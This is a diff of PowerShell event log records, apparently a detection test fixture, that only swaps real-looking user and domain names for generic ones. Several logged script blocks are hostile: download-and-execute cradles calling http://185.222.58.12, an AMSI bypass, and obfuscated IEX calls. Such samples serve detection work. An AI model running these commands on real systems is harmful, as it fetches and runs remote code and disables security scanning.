@@ -5,8 +5,8 @@
     "LogName": "Microsoft-Windows-PowerShell/Operational",
     "Level": "Verbose",
     "Computer": "FIN-WKSTN-07",
-    "UserId": "MERIDIAN\\jsmith",
-    "ScriptBlockText": "Get-ChildItem 'C:\\Users\\jsmith\\Documents' -Recurse | Measure-Object"
+    "UserId": "WIN10-01\\user01",
+    "ScriptBlockText": "Get-ChildItem 'C:\\Users\\user01\\Documents' -Recurse | Measure-Object"
   },
   {
     "TimeCreated": "2026-03-02T08:31:05.742Z",
@@ -14,7 +14,7 @@
     "LogName": "Microsoft-Windows-PowerShell/Operational",
     "Level": "Verbose",
     "Computer": "FIN-DC-01",
-    "UserId": "MERIDIAN\\svc-backup",
+    "UserId": "CORP\\svc-backup",
     "ScriptBlockText": "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties LastLogonDate | Select-Object Name,LastLogonDate"
   },
   {
@@ -23,8 +23,8 @@
     "LogName": "Microsoft-Windows-PowerShell/Operational",
     "Level": "Verbose",
     "Computer": "FIN-WKSTN-07",
-    "UserId": "MERIDIAN\\svc-patch",
-    "ScriptBlockText": "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://patches.meridian.local/2026-03/cumulative.msi' -OutFile 'C:\\Windows\\Temp\\cumulative.msi'"
+    "UserId": "CORP\\svc-patch",
+    "ScriptBlockText": "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://patches.corp.internal/2026-03/cumulative.msi' -OutFile 'C:\\Windows\\Temp\\cumulative.msi'"
   },
   {
     "TimeCreated": "2026-03-02T11:47:33.901Z",
@@ -32,7 +32,7 @@
     "LogName": "Microsoft-Windows-PowerShell/Operational",
     "Level": "Warning",
     "Computer": "FIN-WKSTN-07",
-    "UserId": "MERIDIAN\\jsmith",
+    "UserId": "WIN10-01\\user01",
     "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://185.222.58.12/a')"
   },
   {
@@ -41,7 +41,7 @@
     "LogName": "Microsoft-Windows-PowerShell/Operational",
     "Level": "Warning",
     "Computer": "FIN-WKSTN-07",
-    "UserId": "MERIDIAN\\jsmith",
+    "UserId": "WIN10-01\\user01",
     "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
   },
   {
@@ -50,7 +50,7 @@
     "LogName": "Microsoft-Windows-PowerShell/Operational",
     "Level": "Warning",
     "Computer": "FIN-WKSTN-07",
-    "UserId": "MERIDIAN\\jsmith",
+    "UserId": "WIN10-01\\user01",
     "ScriptBlockText": "(New-Object Net.WebClient).DownloadFile('http://185.222.58.12/s.exe', \"$env:TEMP\\s.exe\"); Start-Process \"$env:TEMP\\s.exe\""
   },
   {
@@ -59,7 +59,7 @@
     "LogName": "Microsoft-Windows-PowerShell/Operational",
     "Level": "Warning",
     "Computer": "FIN-WKSTN-07",
-    "UserId": "MERIDIAN\\jsmith",
+    "UserId": "WIN10-01\\user01",
     "ScriptBlockText": "$x=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAnAGgAZQBsAGwAbwAnAA==')); IEX $x"
   },
   {
@@ -68,7 +68,7 @@
     "LogName": "Microsoft-Windows-PowerShell/Operational",
     "Level": "Warning",
     "Computer": "FIN-WKSTN-07",
-    "UserId": "MERIDIAN\\jsmith",
+    "UserId": "WIN10-01\\user01",
     "ScriptBlockText": "& ([scriptblock]::Create([char]73+[char]69+[char]88+[char]32+[char]39+[char]104+[char]105+[char]39))"
   },
   {
@@ -77,7 +77,7 @@
     "LogName": "Microsoft-Windows-PowerShell/Operational",
     "Level": "Verbose",
     "Computer": "FIN-WKSTN-12",
-    "UserId": "MERIDIAN\\acct-mfin",
+    "UserId": "CORP\\acct-fin",
     "ScriptBlockText": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5"
   }
 ]
